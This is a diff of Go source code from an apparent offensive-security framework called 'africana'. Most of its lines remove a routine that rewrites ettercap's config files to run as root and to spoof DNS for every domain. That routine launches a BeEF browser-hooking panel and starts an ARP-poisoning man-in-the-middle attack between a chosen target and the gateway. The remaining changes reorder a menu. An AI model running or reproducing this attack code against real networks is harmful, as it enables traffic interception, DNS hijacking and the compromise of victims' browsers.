-            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "FAKEDNS " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Lengendery * A 0.0.0.0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
-            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-            userFakeDns, _ := reader.ReadString('\n')
-            userFakeDns = strings.TrimSpace(userFakeDns)
-            if userFakeDns == "" {
-                userFakeDns = "0.0.0.0"
-            }
-            filePathO := "/etc/ettercap/etter.conf.bak_africana"
-            if _, err := os.Stat(filePathO); os.IsNotExist(err) {
-                subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
-                filesToReplacements := map[string]map[string]string{
-                    "/etc/ettercap/etter.conf": {
-                        `ec_uid = 65534`: `ec_uid = 0`,
-                        `ec_gid = 65534`: `ec_gid = 0`,
-                        `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
-                        `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
-                        `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
-                        `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
-                    },
-                }
-            utils.Editors(filesToReplacements)
-            }
-            filePathT := "/etc/ettercap/etter.dns.bak_africana"
-            if _, err := os.Stat(filePathT); os.IsNotExist(err) {
-                subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
-                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s%s", "*", userFakeDns, " A ", userLhost)
-                filesToReplacements := map[string]map[string]string{
-                    "/etc/ettercap/etter.dns": {
-                        `# vim:ts=8:noexpandtab`: newString,
-                     },
-                }
-            utils.Editors(filesToReplacements)
-            }
-            userGateway, err := utils.GetDefaultGatewayIP()
-            if err != nil {
-                panic(err)
-            }
-            fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; ettercap -T -i %s -P dns_spoof -M ARP //%s// //%s//`, userLhostIp, userIface, userTarget, userGateway); fmt.Println()
-            subprocess.Popen(`systemctl stop beef-xss.service; systemctl --no-pager status beef-xss; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
     default:
         fmt.Println(bcolors.BLUE + "( " + bcolors.ORANGE + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
     }
@@ -486,7 +504,7 @@ func BeefEttercap(userTarget string) {
 func BeefInjector(userTarget string) {
     for {
         menus.MenuThreeThree()
-        fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefInject " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Bettercap" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefInject " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Ettercap" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
         fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
         userInput, _ := reader.ReadString('\n')
         userInput = strings.TrimSpace(userInput)
@@ -497,9 +515,9 @@ func BeefInjector(userTarget string) {
         case "0":
             return
         case "1":
-            BeefBettercap (userTarget)
-        case "2":
             BeefEttercap  (userTarget)
+        case "2":
+            BeefBettercap (userTarget)
         default:
             fmt.Println(bcolors.BLUE + "(" + bcolors.RED + "Poor choice of selection. Please try option " + bcolors.GREEN + "00 " + bcolors.YELLOW  + "or " + bcolors.BLUE + "(" + bcolors.DARKCYAN + "0 to 9" + bcolors.BLUE + ")" + bcolors.ENDC)
          }
